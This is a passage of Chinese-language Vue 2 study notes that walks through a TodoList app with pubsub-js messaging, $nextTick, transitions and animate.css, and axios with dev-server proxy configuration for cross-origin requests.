        <input type="text" placeholder="请输入你的任务名称，按回车键确认" @keyup.enter="add"/>
    </div>
</template>

<script>
    import PubSub from "pubsub-js"
    // js 代码
    export default {
        // 给组件起一个名称（可以省略）
        name: 'ToDoHeader',
        props: [ 'todos' ],
        methods: {
            add(value){
                // 判断输入是否为空
                if (!value.target.value.trim()){
                    alert("输入不可为空");
                    return;
                }

                let id = 0;
                // 判断数组是否为空
                if (this.todos.length !== 0){
                    // 获取数组中最后一个元素，取 id，转为整数 + 1，再转为字符串
                    id = String(Number(this.todos[this.todos.length - 1].id) + 1);
                }
                // 加 0
                while (id.length<3){
                    id = "0" + id;
                }
                // 创建对像
                let todo = {
                    id: id,
                    title: value.target.value,
                    done: false
                }

                // 使用 pubsub-js 进行消息发布；pubsub.publish("xxx", 数据);
                PubSub.publish("receive", todo);

                // 清空输入框
                value.target.value = '';
            }
        }
    }
</script>

<style scoped lang="less">
    /* css 样式 */
    /*header*/
    .todo-header {
        input {
            width: 360px;
            height: 28px;
            font-size: 14px;
            border: 1px solid #ccc;
            border-radius: 4px;
            padding: 4px 7px;
        }

        .todo-header input:focus {
            outline: none;
            border-color: rgba(82, 168, 236, 0.8);
            box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075), 0 0 8px rgba(82, 168, 236, 0.6);
        }
    }
</style>
```

```vue
<template>
    <!-- 网页结构 -->
    <ul class="todo-main">
        <!-- 循环 -->
        <li v-for="todo in todos" :key=todo.id>
            <label>
                <!--
                    可以将 :checked="todo.done" 和 @change="listCheck(todo.id) 替换为 :v-model="todo.done"，但是不建议，因为修改了 props
                    @change：改变事件
                -->
                <input type="checkbox" :checked="todo.done" @change="listCheck(todo.id)"/>
                <span v-show="!todo.isEdit">{{ todo.title }}</span>
                <input type="text" :value="todo.title" v-show="todo.isEdit" @blur="listBlur(todo, $event)">
            </label>
            <button class="btn btn-danger" @click="listDelete(todo.id)">删除</button>
            <button class="btn btn-edit" v-show="!todo.isEdit" @click="listEdit(todo)">编辑</button>
        </li>
    </ul>
</template>

<script>
    import PubSub from "pubsub-js"

    // js 代码
    export default {
        // 给组件起一个名称（可以省略）
        name: 'ToDoList',
        props: [ 'todos' ],
        methods: {
            // 勾选
            listCheck(id){
                // 使用 pubsub-js 进行消息发布；pubsub.publish("xxx", 数据);传递 id ，通知 App 组件将对应的 todo 对象的 done 取反
                PubSub.publish("checkTodo", id);
            },
            // 删除
            listDelete(id){
                // 根据用户选择返回布尔值
                if (confirm('确定要删除吗？')){
                    // 使用 pubsub-js 进行消息发布；pubsub.publish("xxx", 数据);传递 id ，通知 App 组件将对应的 todo 对象删除
                    PubSub.publish("deleteTodo", id);
                }
            },
            // 编辑
            listEdit(todo){
                // 判断对象 todo 中是否有 isEdit 属性
                if (Object.prototype.hasOwnProperty.call(todo, "isEdit")){
                    todo.isEdit = true;
                }else{
                    // 给 todo 对象添加属性，以此来控制编辑框的展示
                    this.$set(todo, "isEdit", true);
                }
            },
            // 编辑框失去焦点事件
            listBlur(todo, event){
                // 判断输入是否为空
                if (!event.target.value.trim()){
                    alert("输入不可为空");
                    return;
                }
                // 关闭编辑框
                todo.isEdit = false;
                // 使用 pubsub-js 进行消息发布；传递 id 和 值 ，通知 App 组件修改对应的 todo 对象
                PubSub.publish("updateTodo", [todo.id, event.target.value]);
            }
        }
    }
</script>

<style scoped lang="less">
    /* css 样式 */
    /*main*/
    .todo-main {
        margin-left: 0px;
        border: 1px solid #ddd;
        border-radius: 2px;
        padding: 0px;

        /*item*/
        li {
            list-style: none;
            height: 36px;
            line-height: 36px;
            padding: 0 5px;
            border-bottom: 1px solid #ddd;
        }
        li label {
            float: left;
            cursor: pointer;
        }
        li label li input {
            vertical-align: middle;
            margin-right: 6px;
            position: relative;
            top: -1px;
        }
        li button {
            float: right;
            display: none;
            margin-top: 3px;
        }
        li:before {
            content: initial;
        }
        li:last-child {
            border-bottom: none;
        }
        li:hover{
            background-color: #ddd;
        }
        li:hover button{
            display: block;
        }

    }

</style>
```

```vue
<template>
    <!-- 网页结构 -->
    <div class="todo-footer" v-show="todos.length">
        <label>
            <input type="checkbox" v-model="isAll"/>
        </label>
        <span>
            <span>已完成{{doneTotal}}</span> / 全部{{todos.length}}
        </span>
        <button class="btn btn-danger" @click="clearAllTodo">清除已完成任务</button>
    </div>
</template>

<script>
    import PubSub from "pubsub-js"
    // js 代码
    export default {
        // 给组件起一个名称（可以省略）
        name: 'ToDoFooter',
        props: [ 'todos' ],
        methods: {
            // 清除已完成任务
            clearAllTodo(){
                // 使用 pubsub-js 进行消息发布；pubsub.publish("xxx", 数据);
                PubSub.publish("clearAllTodo");
            }
        },
        computed: {
            // 返回已选择数据的数量
            doneTotal(){
                /**
                 * reduce() 方法：
                 * 参数 1：函数，数组有几个值，就会调用几次
                 *      参数 1：pre：当前值；第一次调用该函数的返回值，作为第二次调用该函数的 pre 的值
                 *      参数 2：current：本次遍历的元素
                 * 参数 2：统计开始的初始值
                 */
                return this.todos.reduce((pre, current)=>{
                    return pre + ( current.done ? 1 : 0 )
                }, 0)
            },
            // 判断是否全选，弱受上方全选则勾选；否则不勾选
            isAll: {
                // 读取展示
                get(){
                    return this.doneTotal === this.todos.length && this.todos.length > 0;
                },
                // 使用 pubsub-js 进行消息发布；pubsub.publish("xxx", 数据);传递是否选择，通知 App 组件将对应的 todo 对象的 done 值修改
                set(value){
                    PubSub.publish("checkAllTodo", value);
                }
            }
        }
    }
</script>

<style scoped lang="less">
    /* css 样式 */
    /*footer*/
    .todo-footer {
        height: 40px;
        line-height: 40px;
        padding-left: 6px;
        margin-top: 5px;

        label {
            display: inline-block;
            margin-right: 20px;
            cursor: pointer;

            input {
                position: relative;
                top: -1px;
                vertical-align: middle;
                margin-right: 5px;
            }
        }
    }

</style>
```

## 14、`nextTick` DOM 渲染完成之后再执行回调函数

1. 语法：`this.$nextTick(回调函数)`
2. 作用：在下一次 DOM 更新结束后执行其指定的回调。
3. 什么时候用：当改变数据后，要基于更新后的新DOM进行某些操作时，要在nextTick所指定的回调函数中执行。

---

TodoList 案例

```javascript
// 引入 vue
import Vue from 'vue'
// 引入 app 组件，他是所有组件的父组件
import App from './App.vue'

// 阻止 vue 在启动时生成开发版提示
Vue.config.productionTip = false

// 创建 vue 实例对象
// $mount('#app') 等价于：el: '#app'，他的原型对象
new Vue({
    // 将 app 组件放入容器中；
    render: h => h(App)
}).$mount('#app')

```

```vue
<template>
    <!-- 在网页中引入组件 -->
    <div class="todo-container">
        <div class="todo-wrap">
            <!-- 传递参数与函数 -->
            <ToDoHeader :todos="todos" />
            <ToDoList :todos="todos" />
            <ToDoFooter :todos="todos" />

        </div>
    </div>
</template>

<script>
    // js 引入组件
    import ToDoHeader from "./components/ToDoHeader.vue"
    import ToDoList from "./components/ToDoList.vue"
    import ToDoFooter from "./components/ToDoFooter.vue"
    import PubSub from "pubsub-js"
    // js 代码
    // 创建组件的简写形式，省略 Vue.extend(options)
    export default {
        // 给组件起一个名称（可以省略）
        name: 'App',
        // vue 引入组件
        components: { ToDoHeader, ToDoList, ToDoFooter },
        data(){
            return {
                // 从本地存储中读取数据，本地存储中没有数据则创建空数组
                todos: JSON.parse(localStorage.getItem("todos")) || []
            }
        },
        methods: {
            // 接收子组件传递过来的对象，添加到数组中
            // 因为 PubSub 传递过来的时两个参数，而我们只需要第二个参数，所以可以使用 _ 对第一个参数进行占位
            receive(_, todo){
                // 将接收的对象放入 todos 数组
                this.todos.push(todo)
            },
            // 接收子组件传递过来的 id，将 done 取反
            checkTodo(_, id){
                this.todos.forEach((todo)=>{
                    if (todo.id === id){
                        todo.done = !todo.done;
                    }
                })
            },
            // 接收子组件传递过来的 id，删除对应的 todo
            deleteTodo(_, id){
                this.todos = this.todos.filter((todo)=>{
                    return todo.id !== id;
                })
            },
            // 全选/取消全选
            checkAllTodo(_, done){
                this.todos.forEach((todo)=>{
                    todo.done = done;
                })
            },
            // 清除已完成任务
            clearAllTodo(){
                this.todos = this.todos.filter((todo)=>{
                    return !todo.done;
                })
            },
            // 编辑
            updateTodo(_, arr){
                this.todos.forEach((todo)=>{
                    if (todo.id === arr[0]){
                        todo.title = arr[1];
                    }
                })
            }
        },
        watch: {
            // 当数据改变时，将数据存入本地存储，监视属性的完整形式
            todos: {
                // 开启深度监视
                deep: true,
                handler(value){
                    localStorage.setItem("todos", JSON.stringify(value));
                }
            }
        },
        mounted() {
            // 使用 pubsub-js 进行消息订阅；pubsub.subscribe("xxx", (消息名, 数据)=>{})
            // 将其返回的 id 挂载到 this 上，以便进行取消订阅；
            this.pubReceiveId = PubSub.subscribe("receive", this.receive);
            this.pubCheckTodoId = PubSub.subscribe("checkTodo", this.checkTodo);
            this.pubDeleteTodoId = PubSub.subscribe("deleteTodo", this.deleteTodo);
            this.pubCheckAllTodoId = PubSub.subscribe("checkAllTodo", this.checkAllTodo);
            this.pubClearAllTodoId = PubSub.subscribe("clearAllTodo", this.clearAllTodo);
            this.pubUpdateTodoId = PubSub.subscribe("updateTodo", this.updateTodo);
        },
        beforeDestroy() {
            // 用 pubsub-js 取消订阅，使用使用 pubsub 的 id 进行取消
            PubSub.unsubscribe(this.pubReceiveId);
            PubSub.unsubscribe(this.pubCheckTodoId);
            PubSub.unsubscribe(this.pubDeleteTodoId);
            PubSub.unsubscribe(this.pubCheckAllTodoId);
            PubSub.unsubscribe(this.pubClearAllTodoId);
            PubSub.unsubscribe(this.pubUpdateTodoId);
        }
    }
</script>

<style lang="less">
    /* css 样式 */
    body {
        background: #fff;

        .todo-container {
            width: 400px;
            margin: 0 auto;

            .todo-wrap {
                padding: 10px;
                border: 1px solid #ddd;
                border-radius: 5px;
            }
        }

        .btn {
            display: inline-block;
            padding: 4px 12px;
            margin-bottom: 0;
            font-size: 14px;
            line-height: 20px;
            text-align: center;
            vertical-align: middle;
            cursor: pointer;
            box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.2), 0 1px 2px rgba(0, 0, 0, 0.05);
            border-radius: 4px;
        }
        .btn:focus {
            outline: none;
        }
        .btn-danger {
            color: #fff;
            background-color: #da4f49;
            border: 1px solid #bd362f;
        }
        .btn-danger:hover {
            color: #fff;
            background-color: #bd362f;
        }
        .btn-edit{
            color: #fff;
            background-color: #90d4f1;
            border: 1px solid rgb(103, 159, 180);
            margin-right: 5px;
        }
        .btn-edit:hover {
            color: #fff;
            background-color: #7db3cc;
        }
    }
</style>
```

```vue
<template>
    <!-- 网页结构 -->
    <div class="todo-header">
        <!-- 调用 add 函数，回车键触发 -->
        <input type="text" placeholder="请输入你的任务名称，按回车键确认" @keyup.enter="add"/>
    </div>
</template>

<script>
    import PubSub from "pubsub-js"
    // js 代码
    export default {
        // 给组件起一个名称（可以省略）
        name: 'ToDoHeader',
        props: [ 'todos' ],
        methods: {
            add(value){
                // 判断输入是否为空
                if (!value.target.value.trim()){
                    alert("输入不可为空");
                    return;
                }

                let id = 0;
                // 判断数组是否为空
                if (this.todos.length !== 0){
                    // 获取数组中最后一个元素，取 id，转为整数 + 1，再转为字符串
                    id = String(Number(this.todos[this.todos.length - 1].id) + 1);
                }
                // 加 0
                while (id.length<3){
                    id = "0" + id;
                }
                // 创建对像
                let todo = {
                    id: id,
                    title: value.target.value,
                    done: false
                }

                // 使用 pubsub-js 进行消息发布；pubsub.publish("xxx", 数据);
                PubSub.publish("receive", todo);

                // 清空输入框
                value.target.value = '';
            }
        }
    }
</script>

<style scoped lang="less">
    /* css 样式 */
    /*header*/
    .todo-header {
        input {
            width: 360px;
            height: 28px;
            font-size: 14px;
            border: 1px solid #ccc;
            border-radius: 4px;
            padding: 4px 7px;
        }

        .todo-header input:focus {
            outline: none;
            border-color: rgba(82, 168, 236, 0.8);
            box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075), 0 0 8px rgba(82, 168, 236, 0.6);
        }
    }
</style>
```

```vue
<template>
    <!-- 网页结构 -->
    <ul class="todo-main">
        <!-- 循环 -->
        <li v-for="(todo, index) in todos" :key=todo.id>
            <label>
                <!--
                    可以将 :checked="todo.done" 和 @change="listCheck(todo.id) 替换为 :v-model="todo.done"，但是不建议，因为修改了 props
                    @change：改变事件
                -->
                <input type="checkbox" :checked="todo.done" @change="listCheck(todo.id)"/>
                <span v-show="!todo.isEdit">{{ todo.title }}</span>
                <input type="text" :value="todo.title" v-show="todo.isEdit" @blur="listBlur(todo, $event)" ref="inputTitle">
            </label>
            <button class="btn btn-danger" @click="listDelete(todo.id)">删除</button>
            <button class="btn btn-edit" v-show="!todo.isEdit" @click="listEdit(todo, index)">编辑</button>
        </li>
    </ul>
</template>

<script>
    import PubSub from "pubsub-js"

    // js 代码
    export default {
        // 给组件起一个名称（可以省略）
        name: 'ToDoList',
        props: [ 'todos' ],
        methods: {
            // 勾选
            listCheck(id){
                // 使用 pubsub-js 进行消息发布；pubsub.publish("xxx", 数据);传递 id ，通知 App 组件将对应的 todo 对象的 done 取反
                PubSub.publish("checkTodo", id);
            },
            // 删除
            listDelete(id){
                // 根据用户选择返回布尔值
                if (confirm('确定要删除吗？')){
                    // 使用 pubsub-js 进行消息发布；pubsub.publish("xxx", 数据);传递 id ，通知 App 组件将对应的 todo 对象删除
                    PubSub.publish("deleteTodo", id);
                }
            },
            // 编辑
            listEdit(todo, index){
                // 判断对象 todo 中是否有 isEdit 属性
                if (Object.prototype.hasOwnProperty.call(todo, "isEdit")){
                    todo.isEdit = true;
                }else{
                    // 给 todo 对象添加属性，以此来控制编辑框的展示
                    this.$set(todo, "isEdit", true);
                }

                // $nextTick：在下一次 DOM 更新结束后执行其指定的回调；因为输入框焦点只能在 DOM 渲染完之后才能获得
                this.$nextTick(()=>{
                    // 让编辑输入框获取焦点
                    this.$refs.inputTitle[index].focus();
                });
            },
            // 编辑框失去焦点事件
            listBlur(todo, event){
                // 判断输入是否为空
                if (!event.target.value.trim()){
                    alert("输入不可为空");
                    return;
                }
                // 关闭编辑框
                todo.isEdit = false;
                // 使用 pubsub-js 进行消息发布；传递 id 和 值 ，通知 App 组件修改对应的 todo 对象
                PubSub.publish("updateTodo", [todo.id, event.target.value]);
            }
        }
    }
</script>

<style scoped lang="less">
    /* css 样式 */
    /*main*/
    .todo-main {
        margin-left: 0px;
        border: 1px solid #ddd;
        border-radius: 2px;
        padding: 0px;

        /*item*/
        li {
            list-style: none;
            height: 36px;
            line-height: 36px;
            padding: 0 5px;
            border-bottom: 1px solid #ddd;
        }
        li label {
            float: left;
            cursor: pointer;
        }
        li label li input {
            vertical-align: middle;
            margin-right: 6px;
            position: relative;
            top: -1px;
        }
        li button {
            float: right;
            display: none;
            margin-top: 3px;
        }
        li:before {
            content: initial;
        }
        li:last-child {
            border-bottom: none;
        }
        li:hover{
            background-color: #ddd;
        }
        li:hover button{
            display: block;
        }

    }

</style>
```

```vue
<template>
    <!-- 网页结构 -->
    <div class="todo-footer" v-show="todos.length">
        <label>
            <input type="checkbox" v-model="isAll"/>
        </label>
        <span>
            <span>已完成{{doneTotal}}</span> / 全部{{todos.length}}
        </span>
        <button class="btn btn-danger" @click="clearAllTodo">清除已完成任务</button>
    </div>
</template>

<script>
    import PubSub from "pubsub-js"
    // js 代码
    export default {
        // 给组件起一个名称（可以省略）
        name: 'ToDoFooter',
        props: [ 'todos' ],
        methods: {
            // 清除已完成任务
            clearAllTodo(){
                // 使用 pubsub-js 进行消息发布；pubsub.publish("xxx", 数据);
                PubSub.publish("clearAllTodo");
            }
        },
        computed: {
            // 返回已选择数据的数量
            doneTotal(){
                /**
                 * reduce() 方法：
                 * 参数 1：函数，数组有几个值，就会调用几次
                 *      参数 1：pre：当前值；第一次调用该函数的返回值，作为第二次调用该函数的 pre 的值
                 *      参数 2：current：本次遍历的元素
                 * 参数 2：统计开始的初始值
                 */
                return this.todos.reduce((pre, current)=>{
                    return pre + ( current.done ? 1 : 0 )
                }, 0)
            },
            // 判断是否全选，弱受上方全选则勾选；否则不勾选
            isAll: {
                // 读取展示
                get(){
                    return this.doneTotal === this.todos.length && this.todos.length > 0;
                },
                // 使用 pubsub-js 进行消息发布；pubsub.publish("xxx", 数据);传递是否选择，通知 App 组件将对应的 todo 对象的 done 值修改
                set(value){
                    PubSub.publish("checkAllTodo", value);
                }
            }
        }
    }
</script>

<style scoped lang="less">
    /* css 样式 */
    /*footer*/
    .todo-footer {
        height: 40px;
        line-height: 40px;
        padding-left: 6px;
        margin-top: 5px;

        label {
            display: inline-block;
            margin-right: 20px;
            cursor: pointer;

            input {
                position: relative;
                top: -1px;
                vertical-align: middle;
                margin-right: 5px;
            }
        }
    }

</style>
```

## 15、过度与动画

### ①、动画与过度

1.  作用：在插入、更新或移除 DOM元素时，在合适的时候给元素添加样式类名。 
2.  写法： 
   1. 准备好样式： 
      - 元素进入的样式：
         1. v-enter：进入的起点
         2. v-enter-active：进入过程中
         3. v-enter-to：进入的终点
      - 元素离开的样式： 
         1. v-leave：离开的起点
         2. v-leave-active：离开过程中
         3. v-leave-to：离开的终点
   2. 使用`<transition>`包裹要过度的元素，并配置name属性： 

```vue
<template>
    <!-- 网页结构 -->
    <div>
        <button @click="isShow = !isShow">动画：显示/隐藏</button>

        <!-- 添加 appear 属性，会在进入网页时调用进入样式 -->
        <Transition appear>
            <h2 class="demo" v-show="isShow">{{name}}</h2>
        </Transition>

        <!-- 给 Transition 定义名称，则需要修改其样式名 -->
        <Transition name="hello">
            <h2 class="demo" v-show="isShow">{{name}}</h2>
        </Transition>
    </div>
</template>

<script>
    // js 代码
    export default{
        // 给组件起一个名称（可以省略）
        // eslint-disable-next-line vue/multi-word-component-names
        name: 'Test',
        data() {
            return {
                name: "月海",
                isShow: true
            }
        }
    }
</script>

<style scoped lang="less">
    /* css 样式 */
    .demo{
        background-color: aquamarine;
    }

    // 使用动画，默认；enter：进入    leave：离开
    .v-enter-active{
        animation: yuehai 1s;
    }
    .v-leave-active{
        animation: yuehai 1s reverse;
    }
    // 使用动画，定义名称
    .hello-enter-active{
        animation: yuehai 500ms;
    }
    .hello-leave-active{
        animation: yuehai 500ms reverse;
    }

    // 定义动画
    @keyframes yuehai {
        from{
            transform: translateX(-100%);
        }
        to{
            transform: translateX(0px);
        }
    }
</style>
```

```vue
<template>
    <!-- 网页结构 -->
    <div>
        <button @click="isShow = !isShow">动画：显示/隐藏</button>

        <!-- 添加 appear 属性，会在进入网页时调用进入样式 -->
        <Transition appear>
            <h2 class="demo" v-show="isShow">{{name}}</h2>
        </Transition>
        
        <!-- 给 Transition 定义名称，则需要修改其样式名 -->
        <Transition appear name="hello">
            <h2 class="demo" v-show="isShow">{{name}}</h2>
        </Transition>
    </div>
</template>

<script>
    // js 代码
    export default{
        // 给组件起一个名称（可以省略）
        // eslint-disable-next-line vue/multi-word-component-names
        name: 'Test2',
        data() {
            return {
                name: "月海",
                isShow: true
            }
        }
    }
</script>

<style scoped lang="less">
    /* css 样式 */
    .demo{
        background-color: chocolate;
    }

    /**
        使用过渡，默认；
        enter：进入的起点；enter-to：进入的终点
        leave：离开的起点；leave-to：离开的终点
     */
    .v-enter{
        transform: translateX(-100%);
    }
    .v-enter-to{
        transform: translateX(0);
    }
    .v-leave{
        transform: translateX(0);
    }
    .v-leave-to{
        transform: translateX(-100%);
    }
    // 使用动画调用过度，进入动画、离开动画
    .v-enter-active,.v-leave-active{
        transition: 1s linear;
    }

    // 使用过渡，定义名称
    .hello-enter{
        transform: translateX(-100%);
    }
    .hello-enter-to{
        transform: translateX(0);
    }
    .hello-leave{
        transform: translateX(0);
    }
    .hello-leave-to{
        transform: translateX(-100%);
    }
    // 使用动画调用过度，进入动画、离开动画
    .hello-enter-active,.hello-leave-active{
        transition: 500ms linear;
    }

</style>
```

   3. 备注：若有多个元素需要过度，则需要使用：`<transition-group>`，且每个元素都要指定`key`值。 

```vue
<template>
    <!-- 网页结构 -->
    <div>
        <button @click="isShow = !isShow">动画：显示/隐藏</button>

        <!-- 添加 appear 属性，会在进入网页时调用进入样式；给 Transition 定义名称，则需要修改其样式名 -->
        <transition-group appear name="hello">
            <!-- 动画只能施加在一个元素上，若是多个元素要使用 transition-group 标签，却每个元素都要有自己的 key -->
            <h2 class="demo" v-show="isShow" key="1">{{name}}</h2>
            <h2 class="demo" v-show="!isShow" key="2">{{name}}</h2>
        </transition-group>
    </div>
</template>

<script>
    // js 代码
    export default{
        // 给组件起一个名称（可以省略）
        // eslint-disable-next-line vue/multi-word-component-names
        name: 'Test3',
        data() {
            return {
                name: "月海",
                isShow: true
            }
        }
    }
</script>

<style scoped lang="less">
    /* css 样式 */
    .demo{
        background-color: #90d4f1;
    }

    /**
        使用过渡，默认；
        enter：进入的起点；enter-to：进入的终点
        leave：离开的起点；leave-to：离开的终点
     */
    // 使用过渡，定义名称
    .hello-enter{
        transform: translateX(-100%);
    }
    .hello-enter-to{
        transform: translateX(0);
    }
    .hello-leave{
        transform: translateX(0);
    }
    .hello-leave-to{
        transform: translateX(-100%);
    }
    // 使用动画调用过度，进入动画、离开动画
    .hello-enter-active,.hello-leave-active{
        transition: 500ms linear;
    }

</style>
```

### ②、集成第三方动画

> 以 animate 为例：[https://github.com/animate-css/animate.css](https://github.com/animate-css/animate.css)

1. 安装库：`npm install animate.css`
2. 引入库：`import 'animate.css'`
3. 使用：
   1. 指定 animate 类名：`name="animate__animated animate__bounce"`
   2. 指定进入动画名：`enter-active-class="animate__swing"`
   3. 指定离开动画名：`leave-active-class="animate__backOutUp"`

```vue
<template>
    <!-- 网页结构 -->
    <div>
        <button @click="isShow = !isShow">动画：显示/隐藏</button>

        <!--
            添加 appear 属性，会在进入网页时调用进入样式
            name="animate__animated animate__bounce"：指定 animate 类名
            enter-active-class="animate__swing"     ：指定进入动画名
            leave-active-class="animate__backOutUp" ：指定离开动画名
        -->
        <transition-group appear
            name="animate__animated animate__bounce"
            enter-active-class="animate__swing"
            leave-active-class="animate__backOutUp"
        >
            <!-- 动画只能施加在一个元素上，若是多个元素要使用 transition-group 标签，却每个元素都要有自己的 key -->
            <h2 class="demo" v-show="isShow" key="1">{{name}}</h2>
            <h2 class="demo" v-show="!isShow" key="2">{{name}}</h2>
        </transition-group>
    </div>
</template>

<script>
    // 引入 animate.css 库
    import 'animate.css'
    // js 代码
    export default{
        // 给组件起一个名称（可以省略）
        // eslint-disable-next-line vue/multi-word-component-names
        name: 'Test4',
        data() {
            return {
                name: "月海",
                isShow: true
            }
        }
    }
</script>

<style scoped lang="less">
    /* css 样式 */
    .demo{
        background-color: orange;
    }

</style>
```

# 五、Vue 中的 ajax

## 1、axios

1. 安装 axios ：`npm i axios`
2. `main.js` 中引入 axios：`import axios from 'axios'`
3. 使用：

```vue
<template>
    <!-- 网页结构；组件里必须要有一个根元素，即此处的 div -->
    <div>
        <button @click="getUser">获取信息</button>
        <h2 class="demo">{{user.name}}</h2>
    </div>
</template>

<script>
    // 引入 axios
    import axios from 'axios'

    // js 代码
    // 创建组件的简写形式，省略 Vue.extend(options)
    export default {
        // 给组件起一个名称（可以省略）
        name: 'App',
        data() {
            return {
                user: {
                    id: null,
                    name: null
                }
            }
        },
        methods: {
            getUser(){
                axios.get('http://localhost:9000/Test/get').then((data) => {
                    console.log("成功", data)
                }).catch((data)=>{
                    console.log("出错了", data)
                })
            }
        }
    }
</script>

<style>
    /* css 样式 */
    .demo{
        background-color: aquamarine;
    }
</style>
```

## 2、解决开发环境 Ajax 跨域问题

- 使用代理服务器

### ①、方式一

- 此方式只能配置一个代理服务器

1. 在根目录下的 vue.config.js 文件中配置代理服务器

```javascript
const { defineConfig } = require('@vue/cli-service')
module.exports = defineConfig({
  transpileDependencies: true,
  // 关闭语法检查
  lintOnSave: false,

  // 配置代理服务器，方式一，此方式只能配置一个代理服务器
  devServer: {
    proxy: 'http://localhost:9000'
  }
})

```

2. 使用 ajax 调用前端自身端口（8080）

```vue
<template>
    <!-- 网页结构；组件里必须要有一个根元素，即此处的 div -->
    <div>
        <button @click="getUser">获取信息</button>
        <h2 class="demo">{{user.name}}</h2>
    </div>
</template>

<script>
    // 引入 axios
    import axios from 'axios'

    // js 代码
    // 创建组件的简写形式，省略 Vue.extend(options)
    export default {
        // 给组件起一个名称（可以省略）
        name: 'App',
        data() {
            return {
                user: {
                    id: null,
                    name: null
                }
            }
        },
        methods: {
            getUser(){
                axios.get('http://localhost:8080/Test/get').then((data) => {
                    console.log("成功", data)
                    this.user.name = data.data.data[0].name
                }).catch((data)=>{
                    console.log("出错了", data)
                })
            }
        }
    }
</script>

<style>
    /* css 样式 */
    .demo{
        background-color: aquamarine;
    }
</style>
```

![image.png](https://www.yue-hai.top:10300/file/downloadFile?fullFilePath=%2Fhome%2Fyan%2F%E6%A1%8C%E9%9D%A2%2F%E5%86%85%E5%AD%98%2F%E6%96%87%E6%A1%A3%E8%B5%84%E6%96%99%2FTakeDown%2FWeb%2FJS%20%E6%A1%86%E6%9E%B6%2Fattachments%2F2023-07-25-12--50-59-884--T4RTUE5nFJgnsg.png)

### ②、方式二（推荐）

- 此方式可以配置多个代理服务器

1. 在根目录下的 vue.config.js 文件中配置代理服务器

```javascript
const { defineConfig } = require('@vue/cli-service')
module.exports = defineConfig({
    transpileDependencies: true,
    // 关闭语法检查
    lintOnSave: false,

    // 配置代理服务器（方式二）
    devServer: {
        proxy: {
            // /Boot1：请求前缀
            '/Boot1': {
                target: 'http://localhost:9000',
                // 正则匹配，将请求路径中的 /Boot1 替换为空；若不加则路径是：http://localhost:8080/Boot1/Test/get
                pathRewrite: { '^/Boot1' : '' },
                // 用于支持 websocket
                ws: true,
                // 是否将请求伪装为服务器端口（默认为 true）
                changeOrigin: true
            },

            // 配置第二个代理服务器
            '/Boot2': {
                target: 'http://localhost:9001',
                pathRewrite: { '^/Boot2' : '' }
            }
        }
    }
})

```

2. 使用 ajax 调用前端自身端口（8080）

```vue
<template>
    <!-- 网页结构；组件里必须要有一个根元素，即此处的 div -->
    <div>
        <button @click="getUser">获取信息</button>
        <h2 class="demo">Boot1：{{user1.name}}</h2>
        <h2 class="demo">Boot2：{{user2.name}}</h2>
    </div>
</template>

<script>
    // 引入 axios
    import axios from 'axios'

    // js 代码
    // 创建组件的简写形式，省略 Vue.extend(options)
    export default {
        // 给组件起一个名称（可以省略）
        name: 'App',
        data() {
            return {
                user1: {
                    id: null,
                    name: null
                },
                user2: {
                    id: null,
                    name: null
                }
            }
        },
        methods: {
            getUser(){
                // 跨域请求 Boot1 服务器
                axios.get('http://localhost:8080/Boot1/Test/get').then((data) => {
                    console.log("Boot1 成功", data)
                    this.user1.name = data.data.data[0].name
                }).catch((data)=>{
                    console.log("Boot1 出错了", data)
                })

                // 跨域请求 Boot2 服务器
                axios.get('http://localhost:8080/Boot2/Test/get').then((data) => {
                    console.log("Boot2 成功", data)
                    this.user2.name = data.data.data[0].name
                }).catch((data)=>{
                    console.log("Boot2 出错了", data)
                })
            }
        }
    }
</script>

<style>
    /* css 样式 */
    .demo{
        background-color: aquamarine;
    }
</style>
```

![image.png](https://www.yue-hai.top:10300/file/downloadFile?fullFilePath=%2Fhome%2Fyan%2F%E6%A1%8C%E9%9D%A2%2F%E5%86%85%E5%AD%98%2F%E6%96%87%E6%A1%A3%E8%B5%84%E6%96%99%2FTakeDown%2FWeb%2FJS%20%E6%A1%86%E6%9E%B6%2Fattachments%2F2023-07-25-12--51-00-032--thXSOH8AmL3BzA.png)

## 3、users 用户搜索案例

1. 在根目录下的 vue.config.js 文件中配置代理服务器

```javascript
const { defineConfig } = require('@vue/cli-service')
module.exports = defineConfig({
    transpileDependencies: true,
    // 关闭语法检查
    lintOnSave: false,

    // 配置代理服务器（方式二）
    devServer: {
        proxy: {
            // /Boot1：请求前缀
            '/Boot1': {
                target: 'http://localhost:9000',
                // 正则匹配，将请求路径中的 /Boot1 替换为空；若不加则路径是：http://localhost:8080/Boot1/Test/get
                pathRewrite: { '^/Boot1' : '' }
            }
        }
    }
})

```

2. app

```vue
<template>
    <!-- 网页结构；组件里必须要有一个根元素，即此处的 div -->
    <div class="container">
        <Search/>
        <List/>
    </div>
</template>

<script>
    // 引入 bootstrap.css 样式
    import './assets/bootstrap/css/bootstrap.css'

    // 引入组件
    import Search from './components/Search.vue'
    import List from './components/List.vue'

    // js 代码
    // 创建组件的简写形式，省略 Vue.extend(options)
    export default {
        // 给组件起一个名称（可以省略）
        name: 'App',
        components: { Search, List }
    }
</script>

<style>
    /* css 样式 */
</style>
```

3. Search 组件

```vue
<template>
    <section class="jumbotron">
        <h3 class="jumbotron-heading">Search yuehai Users</h3>
        <div>
            <input type="text" placeholder="enter the name you search" v-model="searchId"/>&nbsp;
            <button @click="getUser">搜索</button>
        </div>
    </section>
</template>

<script>
    // 引入 axios
    import axios from 'axios'
    // 引入 pubsub-js 消息订阅与发布
    import pubsub from 'pubsub-js'

    export default {
        // eslint-disable-next-line vue/multi-word-component-names
        name: "Search",
        data() {
            return {
                searchId: null
            }
        },
        methods: {
            getUser(){
                // 点击搜索，更改页面状态
                pubsub.publish("getUser", {isFirst: false, isLoading: true, errMsg: '', userList: []});

                // 跨域请求 Boot1 服务器
                axios.get(`http://localhost:8080/Boot1/Test/searchId?searchId=${this.searchId}`).then((response) => {
                    console.log("Boot1 成功", response.data.data);
                    // 收到结果，更改页面状态，传递数据
                    pubsub.publish("getUser", {isLoading: false, errMsg: '', userList: response.data.data});
                }).catch((err)=>{
                    console.log("Boot1 出错了", err);
                    // 请求失败，更改页面状态，传递数据
                    pubsub.publish("getUser", {isLoading: false, errMsg: err, userList: []});
                })
            }
        }
    }
</script>

<style scoped>

</style>
```

4. List 组件

```vue
<template>
    <div class="row">
        <div class="card" v-for="user in info.userList" :key="user.id">
            <a href="https://github.com/xxxxxx" target="_blank">
